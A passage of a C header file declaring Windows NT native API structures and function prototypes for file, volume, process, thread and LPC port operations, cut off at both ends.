*PFILE_SFIO_VOLUME_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_LINK_ENTRY_INFORMATION {\r\n    ULONG NextEntryOffset;\r\n    LONGLONG ParentFileId;\r\n    ULONG FileNameLength;\r\n    WCHAR FileName[1];\r\n} FILE_LINK_ENTRY_INFORMATION, *PFILE_LINK_ENTRY_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_LINKS_INFORMATION\r\n{\r\n    ULONG BytesNeeded;\r\n    ULONG EntriesReturned;\r\n    FILE_LINK_ENTRY_INFORMATION Entry;\r\n} FILE_LINKS_INFORMATION, *PFILE_LINKS_INFORMATION; \r\n\r\ntypedef struct _FILE_ID_GLOBAL_TX_DIR_INFORMATION\r\n{\r\n  ULONG          NextEntryOffset;\r\n  ULONG          FileIndex;\r\n  LARGE_INTEGER  CreationTime;\r\n  LARGE_INTEGER  LastAccessTime;\r\n  LARGE_INTEGER  LastWriteTime;\r\n  LARGE_INTEGER  ChangeTime;\r\n  LARGE_INTEGER  EndOfFile;\r\n  LARGE_INTEGER  AllocationSize;\r\n  ULONG          FileAttributes;\r\n  ULONG          FileNameLength;\r\n  LARGE_INTEGER  FileId;\r\n  GUID           LockingTransactionId;\r\n  ULONG          TxInfoFlags;\r\n  WCHAR          FileName[1];\r\n} FILE_ID_GLOBAL_TX_DIR_INFORMATION, *PFILE_ID_GLOBAL_TX_DIR_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_IS_REMOTE_DEVICE_INFORMATION\r\n{\r\n    BOOLEAN IsRemote;\r\n} FILE_IS_REMOTE_DEVICE_INFORMATION, *PFILE_IS_REMOTE_DEVICE_INFORMATION;\r\n\r\ntypedef struct _FILE_NUMA_NODE_INFORMATION {\r\n    USHORT NodeNumber;\r\n} FILE_NUMA_NODE_INFORMATION, *PFILE_NUMA_NODE_INFORMATION;\r\n\r\n/*\r\ntypedef struct _FILE_REMOTE_PROTOCOL_INFO\r\n{\r\n  USHORT StructureVersion;\r\n  USHORT StructureSize;\r\n  ULONG  Protocol;\r\n  USHORT ProtocolMajorVersion;\r\n  USHORT ProtocolMinorVersion;\r\n  USHORT ProtocolRevision;\r\n  USHORT Reserved;\r\n  ULONG  Flags;\r\n  struct {\r\n    ULONG Reserved[8];\r\n  } GenericReserved;\r\n  struct {\r\n    ULONG Reserved[16];\r\n  } ProtocolSpecificReserved;\r\n} FILE_REMOTE_PROTOCOL_INFO, *PFILE_REMOTE_PROTOCOL_INFO;\r\n*/\r\n\r\ntypedef enum _FSINFOCLASS {\r\n    FileFsVolumeInformation       = 1,\r\n    FileFsLabelInformation,                 // 0x02\r\n    FileFsSizeInformation,                  // 0x03\r\n    FileFsDeviceInformation,                // 0x04\r\n    FileFsAttributeInformation,             // 0x05\r\n    FileFsControlInformation,               // 0x06\r\n    FileFsFullSizeInformation,              // 0x07\r\n    FileFsObjectIdInformation,              // 0x08\r\n    FileFsDriverPathInformation,            // 0x09\r\n    FileFsVolumeFlagsInformation,           // 0x0A\r\n    FileFsMaximumInformation                // 0x0B\r\n} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;\r\n                                            \r\n                                            \r\ntypedef struct _FILE_FS_VOLUME_INFORMATION {\r\n    LARGE_INTEGER VolumeCreationTime;\r\n    ULONG VolumeSerialNumber;\r\n    ULONG VolumeLabelLength;\r\n    BOOLEAN SupportsObjects;\r\n    WCHAR VolumeLabel[1];\r\n} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_LABEL_INFORMATION {\r\n    ULONG VolumeLabelLength;\r\n    WCHAR VolumeLabel[1];\r\n} FILE_FS_LABEL_INFORMATION, *PFILE_FS_LABEL_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_SIZE_INFORMATION {\r\n    LARGE_INTEGER TotalAllocationUnits;\r\n    LARGE_INTEGER AvailableAllocationUnits;\r\n    ULONG SectorsPerAllocationUnit;\r\n    ULONG BytesPerSector;\r\n} FILE_FS_SIZE_INFORMATION, *PFILE_FS_SIZE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_DEVICE_INFORMATION {\r\n    DEVICE_TYPE DeviceType;\r\n    ULONG Characteristics;\r\n} FILE_FS_DEVICE_INFORMATION, *PFILE_FS_DEVICE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_ATTRIBUTE_INFORMATION {\r\n    ULONG FileSystemAttributes;\r\n    LONG MaximumComponentNameLength;\r\n    ULONG FileSystemNameLength;\r\n    WCHAR FileSystemName[1];\r\n} FILE_FS_ATTRIBUTE_INFORMATION, *PFILE_FS_ATTRIBUTE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_CONTROL_INFORMATION {\r\n    LARGE_INTEGER FreeSpaceStartFiltering;\r\n    LARGE_INTEGER FreeSpaceThreshold;\r\n    LARGE_INTEGER FreeSpaceStopFiltering;\r\n    LARGE_INTEGER DefaultQuotaThreshold;\r\n    LARGE_INTEGER DefaultQuotaLimit;\r\n    ULONG FileSystemControlFlags;\r\n} FILE_FS_CONTROL_INFORMATION, *PFILE_FS_CONTROL_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_FULL_SIZE_INFORMATION {\r\n    LARGE_INTEGER TotalAllocationUnits;\r\n    LARGE_INTEGER CallerAvailableAllocationUnits;\r\n    LARGE_INTEGER ActualAvailableAllocationUnits;\r\n    ULONG SectorsPerAllocationUnit;\r\n    ULONG BytesPerSector;\r\n} FILE_FS_FULL_SIZE_INFORMATION, *PFILE_FS_FULL_SIZE_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_OBJECTID_INFORMATION {\r\n    UCHAR ObjectId[16];\r\n    UCHAR ExtendedInfo[48];\r\n} FILE_FS_OBJECTID_INFORMATION, *PFILE_FS_OBJECTID_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_DRIVER_PATH_INFORMATION {\r\n    BOOLEAN DriverInPath;\r\n    ULONG   DriverNameLength;\r\n    WCHAR   DriverName[1];\r\n} FILE_FS_DRIVER_PATH_INFORMATION, *PFILE_FS_DRIVER_PATH_INFORMATION;\r\n\r\n\r\ntypedef struct _FILE_FS_VOLUME_FLAGS_INFORMATION {\r\n    ULONG Flags;\r\n} FILE_FS_VOLUME_FLAGS_INFORMATION, *PFILE_FS_VOLUME_FLAGS_INFORMATION;\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCreateFile(\r\n    OUT PHANDLE FileHandle,\r\n    IN  ACCESS_MASK DesiredAccess,\r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN  PLARGE_INTEGER AllocationSize,\r\n    IN  ULONG FileAttributes,\r\n    IN  ULONG ShareAccess,\r\n    IN  ULONG CreateDisposition,\r\n    IN  ULONG CreateOptions,\r\n    IN  PVOID EaBuffer,\r\n    IN  ULONG EaLength);\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwOpenFile(\r\n    OUT PHANDLE FileHandle,\r\n    IN ACCESS_MASK DesiredAccess,\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN ULONG ShareAccess,\r\n    IN ULONG OpenOptions\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryAttributesFile(\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes,\r\n    OUT PFILE_BASIC_INFORMATION FileInformation\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryAttributesFile(\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes,\r\n    OUT PFILE_BASIC_INFORMATION FileInformation\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FileInformation,\r\n    IN ULONG Length,\r\n    IN FILE_INFORMATION_CLASS FileInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FileInformation,\r\n    IN ULONG Length,\r\n    IN FILE_INFORMATION_CLASS FileInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryDirectoryFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FileInformation,\r\n    IN ULONG Length,\r\n    IN FILE_INFORMATION_CLASS FileInformationClass,\r\n    IN BOOLEAN ReturnSingleEntry,\r\n    IN PUNICODE_STRING FileName OPTIONAL,\r\n    IN BOOLEAN RestartScan\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryDirectoryFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FileInformation,\r\n    IN ULONG Length,\r\n    IN FILE_INFORMATION_CLASS FileInformationClass,\r\n    IN BOOLEAN ReturnSingleEntry,\r\n    IN PUNICODE_STRING FileName OPTIONAL,\r\n    IN BOOLEAN RestartScan\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryVolumeInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FsInformation,\r\n    IN ULONG Length,\r\n    IN FS_INFORMATION_CLASS FsInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryVolumeInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FsInformation,\r\n    IN ULONG Length,\r\n    IN FS_INFORMATION_CLASS FsInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PVOID FileInformation,\r\n    IN ULONG Length,\r\n    IN FILE_INFORMATION_CLASS FileInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PVOID FileInformation,\r\n    IN ULONG Length,\r\n    IN FILE_INFORMATION_CLASS FileInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetVolumeInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FsInformation,\r\n    IN ULONG Length,\r\n    IN FS_INFORMATION_CLASS FsInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetVolumeInformationFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID FsInformation,\r\n    IN ULONG Length,\r\n    IN FS_INFORMATION_CLASS FsInformationClass\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtQueryEaFile(\r\n    IN  HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID Buffer,\r\n    IN  ULONG Length,\r\n    IN  BOOLEAN ReturnSingleEntry,\r\n    IN  PVOID EaList OPTIONAL,\r\n    IN  ULONG EaListLength,\r\n    IN  PULONG EaIndex OPTIONAL,\r\n    IN  BOOLEAN RestartScan);\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryEaFile(\r\n    IN  HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID Buffer,\r\n    IN  ULONG Length,\r\n    IN  BOOLEAN ReturnSingleEntry,\r\n    IN  PVOID EaList OPTIONAL,\r\n    IN  ULONG EaListLength,\r\n    IN  PULONG EaIndex OPTIONAL,\r\n    IN  BOOLEAN RestartScan);\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetEaFile(\r\n    IN  HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN  PVOID Buffer,\r\n    IN  ULONG Length);\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetEaFile(\r\n    IN  HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN  PVOID Buffer,\r\n    IN  ULONG Length);\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtReadFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID Buffer,\r\n    IN ULONG Length,\r\n    IN PLARGE_INTEGER ByteOffset OPTIONAL,\r\n    IN PULONG Key OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwReadFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    OUT PVOID Buffer,\r\n    IN ULONG Length,\r\n    IN PLARGE_INTEGER ByteOffset OPTIONAL,\r\n    IN PULONG Key OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtWriteFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PVOID Buffer,\r\n    IN ULONG Length,\r\n    IN PLARGE_INTEGER ByteOffset OPTIONAL,\r\n    IN PULONG Key OPTIONAL\r\n    ); \r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwWriteFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PVOID Buffer,\r\n    IN ULONG Length,\r\n    IN PLARGE_INTEGER ByteOffset OPTIONAL,\r\n    IN PULONG Key OPTIONAL\r\n    ); \r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtDeleteFile(\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwDeleteFile(\r\n    IN POBJECT_ATTRIBUTES ObjectAttributes\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtFlushBuffersFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwFlushBuffersFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwDeviceIoControlFile(      \r\n    IN  HANDLE FileHandle,\r\n    IN  HANDLE Event,\r\n    IN  PIO_APC_ROUTINE ApcRoutine,\r\n    IN  PVOID ApcContext,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN  ULONG IoControlCode,\r\n    IN  PVOID InputBuffer,\r\n    IN  ULONG InputBufferLength,\r\n    IN  PVOID OutputBuffer,\r\n    IN  ULONG OutputBufferLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtFsControlFile(      \r\n    IN  HANDLE FileHandle,\r\n    IN  HANDLE Event,\r\n    IN  PIO_APC_ROUTINE ApcRoutine,\r\n    IN  PVOID ApcContext,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN  ULONG FsControlCode,\r\n    IN  PVOID InputBuffer,\r\n    IN  ULONG InputBufferLength,\r\n    IN  PVOID OutputBuffer,\r\n    IN  ULONG OutputBufferLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwFsControlFile(      \r\n    IN  HANDLE FileHandle,\r\n    IN  HANDLE Event,\r\n    IN  PIO_APC_ROUTINE ApcRoutine,\r\n    IN  PVOID ApcContext,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN  ULONG FsControlCode,\r\n    IN  PVOID InputBuffer,\r\n    IN  ULONG InputBufferLength,\r\n    IN  PVOID OutputBuffer,\r\n    IN  ULONG OutputBufferLength\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCancelIoFile(\r\n    IN HANDLE Filehandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCancelIoFile(\r\n    IN HANDLE Filehandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtLockFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PLARGE_INTEGER ByteOffset,\r\n    IN PLARGE_INTEGER Length,\r\n    IN ULONG Key,\r\n    IN BOOLEAN FailImmediately,\r\n    IN BOOLEAN ExclusiveLock\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwLockFile(\r\n    IN HANDLE FileHandle,\r\n    IN HANDLE Event OPTIONAL,\r\n    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,\r\n    IN PVOID ApcContext OPTIONAL,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PLARGE_INTEGER ByteOffset,\r\n    IN PLARGE_INTEGER Length,\r\n    IN ULONG Key,\r\n    IN BOOLEAN FailImmediately,\r\n    IN BOOLEAN ExclusiveLock\r\n    );\r\n\r\n\r\nNTSTATUS\r\nNtUnlockFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PLARGE_INTEGER ByteOffset,\r\n    IN PLARGE_INTEGER Length,\r\n    IN ULONG Key\r\n    );\r\n\r\n\r\nNTSTATUS\r\nZwUnlockFile(\r\n    IN HANDLE FileHandle,\r\n    OUT PIO_STATUS_BLOCK IoStatusBlock,\r\n    IN PLARGE_INTEGER ByteOffset,\r\n    IN PLARGE_INTEGER Length,\r\n    IN ULONG Key\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nBOOLEAN\r\nNTAPI\r\nRtlDosPathNameToNtPathName_U (\r\n    IN  PWSTR DosPathName,\r\n    OUT PUNICODE_STRING NtPathName,\r\n    OUT PWSTR * NtFileNamePart OPTIONAL,\r\n    OUT PCURDIR DirectoryInfo OPTIONAL\r\n    );\r\n\r\n\r\n//-----------------------------------------------------------------------------\r\n// Process functions\r\n\r\n#define GDI_HANDLE_BUFFER_SIZE      34 \r\n\r\n// For ProcessExecuteFlags\r\n#define MEM_EXECUTE_OPTION_DISABLE   0x01\r\n#define MEM_EXECUTE_OPTION_ENABLE    0x02\r\n#define MEM_EXECUTE_OPTION_PERMANENT 0x08\r\n\r\ntypedef struct _RTL_DRIVE_LETTER_CURDIR\r\n{\r\n    USHORT Flags;\r\n    USHORT Length;\r\n    ULONG  TimeStamp;\r\n    STRING DosPath;\r\n\r\n} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;\r\n\r\n\r\ntypedef struct _SECTION_IMAGE_INFORMATION\r\n{\r\n    PVOID TransferAddress;\r\n    ULONG ZeroBits;\r\n    ULONG_PTR MaximumStackSize;\r\n    ULONG_PTR CommittedStackSize;\r\n    ULONG SubSystemType;\r\n    union _SECTION_IMAGE_INFORMATION_u0\r\n    {\r\n        struct _SECTION_IMAGE_INFORMATION_s0\r\n        {\r\n            USHORT SubSystemMinorVersion;\r\n            USHORT SubSystemMajorVersion;\r\n        };\r\n        ULONG SubSystemVersion;\r\n    };\r\n    ULONG GpValue;\r\n    USHORT ImageCharacteristics;\r\n    USHORT DllCharacteristics;\r\n    USHORT Machine;\r\n    BOOLEAN ImageContainsCode;\r\n    BOOLEAN Spare1;\r\n    ULONG LoaderFlags;\r\n    ULONG Reserved[2];\r\n\r\n} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION; \r\n\r\n\r\ntypedef struct _RTL_USER_PROCESS_INFORMATION\r\n{\r\n    ULONG Length;\r\n    HANDLE ProcessHandle;\r\n    HANDLE ThreadHandle;\r\n    CLIENT_ID ClientId;\r\n    SECTION_IMAGE_INFORMATION ImageInformation;\r\n\r\n} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION; \r\n\r\n\r\n//\r\n// Process Environment Block\r\n//\r\n\r\ntypedef struct _PEB_FREE_BLOCK\r\n{\r\n    struct _PEB_FREE_BLOCK *Next;\r\n    ULONG Size;\r\n\r\n} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK; \r\n\r\n\r\ntypedef VOID (NTAPI *PUSER_THREAD_START_ROUTINE)(IN PVOID ApcArgument1);\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlAdjustPrivilege(\r\n    ULONG    Privilege,\r\n    BOOLEAN  Enable,\r\n    BOOLEAN  CurrentThread,\r\n    PBOOLEAN Enabled\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlCreateProcessParameters(\r\n    PRTL_USER_PROCESS_PARAMETERS *ProcessParameters,\r\n    PUNICODE_STRING ImagePathName,\r\n    PUNICODE_STRING DllPath,\r\n    PUNICODE_STRING CurrentDirectory,\r\n    PUNICODE_STRING CommandLine,\r\n    PVOID Environment,\r\n    PUNICODE_STRING WindowTitle,\r\n    PUNICODE_STRING DesktopInfo,\r\n    PUNICODE_STRING ShellInfo,\r\n    PUNICODE_STRING RuntimeData\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlDestroyProcessParameters(\r\n    PRTL_USER_PROCESS_PARAMETERS ProcessParameters\r\n    ); \r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nRtlCreateUserProcess(\r\n    PUNICODE_STRING NtImagePathName,\r\n    ULONG Attributes,\r\n    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,\r\n    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,\r\n    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,\r\n    HANDLE ParentProcess,\r\n    BOOLEAN InheritHandles,\r\n    HANDLE DebugPort,\r\n    HANDLE ExceptionPort,\r\n    PRTL_USER_PROCESS_INFORMATION ProcessInformation\r\n    ); \r\n\r\n\r\n\r\n#define NtCurrentProcess() ((HANDLE) -1)\r\n#define NtCurrentThread()  ((HANDLE) -2)\r\n#define NtCurrentPeb()     (PPEB)(NtCurrentTeb()->ProcessEnvironmentBlock)\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtCreateProcess(\r\n    OUT PHANDLE ProcessHandle,\r\n    IN  ACCESS_MASK DesiredAccess,\r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN  HANDLE ParentProcess,\r\n    IN  BOOLEAN InheritObjectTable,\r\n    IN  HANDLE SectionHandle OPTIONAL,\r\n    IN  HANDLE DebugPort OPTIONAL,\r\n    IN  HANDLE ExceptionPort OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwCreateProcess(\r\n    OUT PHANDLE ProcessHandle,\r\n    IN  ACCESS_MASK DesiredAccess,\r\n    IN  POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\r\n    IN  HANDLE ParentProcess,\r\n    IN  BOOLEAN InheritObjectTable,\r\n    IN  HANDLE SectionHandle OPTIONAL,\r\n    IN  HANDLE DebugPort OPTIONAL,\r\n    IN  HANDLE ExceptionPort OPTIONAL\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryInformationProcess(\r\n    IN HANDLE ProcessHandle,\r\n    IN PROCESSINFOCLASS ProcessInformationClass,\r\n    OUT PVOID ProcessInformation,\r\n    IN ULONG ProcessInformationLength,\r\n    OUT PULONG ReturnLength OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwQueryInformationThread(\r\n    IN HANDLE ThreadHandle,\r\n    IN THREADINFOCLASS ThreadInformationClass,\r\n    OUT PVOID ThreadInformation,\r\n    IN ULONG ThreadInformationLength,\r\n    OUT PULONG ReturnLength OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSetInformationProcess (\r\n    IN HANDLE ProcessHandle,\r\n    IN PROCESSINFOCLASS ProcessInformationClass,\r\n    IN PVOID ProcessInformation,\r\n    IN ULONG ProcessInformationLength\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwSetInformationProcess(\r\n    IN HANDLE ProcessHandle,\r\n    IN PROCESSINFOCLASS ProcessInformationClass,\r\n    IN PVOID ProcessInformation,\r\n    IN ULONG ProcessInformationLength\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtSuspendThread(\r\n    IN HANDLE ThreadHandle,\r\n    OUT PULONG PreviousSuspendCount OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtResumeThread(\r\n    IN HANDLE ThreadHandle,\r\n    OUT PULONG PreviousSuspendCount OPTIONAL\r\n    );\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtTerminateThread(\r\n    HANDLE Thread,\r\n    NTSTATUS ExitStatus\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwTerminateThread(\r\n    HANDLE Thread,\r\n    NTSTATUS ExitStatus\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nNtTerminateProcess(\r\n    HANDLE Process,\r\n    NTSTATUS ExitStatus\r\n    );\r\n\r\n\r\nNTSYSAPI\r\nNTSTATUS\r\nNTAPI\r\nZwTerminateProcess(\r\n    HANDLE Process,\r\n    NTSTATUS ExitStatus\r\n    );\r\n\r\n//------------------------------------------------------------------------------\r\n// LPC Functions\r\n\r\n#define MAX_LPC_DATA 0x130    // Maximum number of bytes that can be copied through LPC\r\n\r\n// Valid values for PORT_MESSAGE::u2::s2::Type\r\n#define LPC_REQUEST                  1\r\n#define LPC_REPLY                    2\r\n#define LPC_DATAGRAM                 3\r\n#define LPC_LOST_REPLY               4\r\n#define LPC_PORT_CLOSED              5\r\n#define LPC_CLIENT_DIED              6\r\n#define LPC_EXCEPTION                7\r\n#define LPC_DEBUG_EVENT              8\r\n#define LPC_ERROR_EVENT              9\r\n#define LPC_CONNECTION_REQUEST      10\r\n\r\n#define ALPC_REQUEST            0x2000 | LPC_REQUEST\r\n#define ALPC_CONNECTION_REQUEST 0x2000 | LPC_CONNECTION_REQUEST\r\n\r\n\r\n//\r\n// Define header for Port Message\r\n//\r\n\r\ntypedef struct _PORT_MESSAGE\r\n{\r\n    union\r\n    {\r\n        struct\r\n        {\r\n            USHORT DataLength;          // Length of data following the header (bytes)\r\n            USHORT TotalLength;         // Length of data + sizeof(PORT_MESSAGE)\r\n        } s1;\r\n        ULONG Length;\r\n    } u1;\r\n\r\n    union\r\n    {\r\n        struct\r\n        {\r\n            USHORT Type;\r\n            USHORT DataInfoOffset;\r\n        } s2;\r\n        ULONG ZeroInit;\r\n    } u2;\r\n\r\n    union\r\n    {\r\n        CLIENT_ID ClientId;\r\n        double   DoNotUseThisField;     // Force quadword alignment\r\n    };\r\n\r\n    ULONG  MessageId;                   // Identifier of the particular message instance\r\n\r\n    union\r\n    {\r\n        ULONG_PTR ClientViewSize;       // Size of section created by the sender (in bytes)\r\n        ULONG 